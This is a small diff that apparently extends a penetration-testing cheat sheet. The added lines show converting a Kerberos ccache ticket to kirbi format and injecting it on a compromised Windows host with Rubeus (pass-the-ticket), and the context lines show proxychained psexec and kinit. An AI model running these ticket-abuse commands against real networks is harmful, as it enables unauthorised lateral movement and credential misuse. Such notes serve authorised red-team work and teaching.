@@ -120,3 +120,17 @@ proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administr
 ```
 proxychains kinit -R
 ```
+
+#### Convert ccache to Kirbi&#x20;
+
+Convert ccache to kirbi
+
+```
+./ticket_converter.py admin.ccache admin.kirbi
+```
+
+inject ticket on compromised host
+
+```
+.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
+```
